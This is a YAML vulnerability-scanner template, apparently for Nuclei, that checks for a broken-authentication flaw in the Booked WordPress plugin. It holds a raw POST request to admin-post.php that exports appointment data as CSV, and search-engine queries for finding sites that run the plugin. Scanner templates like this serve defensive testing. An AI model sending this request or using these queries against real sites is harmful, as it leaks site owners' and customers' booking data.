@@ -1,0 +1,55 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - End Time
+            - Start Time
+            - Calendar
+        - part: header
+          type: word
+          words:
+            - text/csv
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /wp-admin/admin-post.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          booked_export_appointments_csv=
+id: booked-export-csv
+info:
+    author: random-robbie
+    classification:
+        cpe: cpe:2.3:a:twinkletoessoftware:booked:*:*:*:*:*:*:*:*
+    description: |
+        The Booked plugin for WordPress is vulnerable to authorization bypass due to missing capability checks on several functions hooked via AJAX actions in versions up to, and including, 2.2.5. This makes it possible for authenticated attackers with subscriber-level permissions and above to execute several unauthorized actions.
+    metadata:
+        fofa-query: wp-content/plugins/booked/
+        google-query: inurl:"/wp-content/plugins/booked/"
+        max-request: 1
+        product: booked
+        publicwww-query: /wp-content/plugins/booked/
+        vendor: twinkletoessoftware
+        verified: true
+    name: Booked < 2.2.6 - Broken Authentication
+    reference:
+        - https://codecanyon.net/item/booked-appointments-appointment-booking-for-wordpress/9466968
+        - http://boxyupdates.com/changelog.php?p=booked
+        - https://wpscan.com/vulnerability/10107
+    remediation: Fixed in version 2.2.6
+    severity: high
+    tags:
+        - wordpress
+        - wpscan
+        - wp-plugin
+        - wp
+        - booked
+        - bypass
+        - WordPress
+        - authenticate
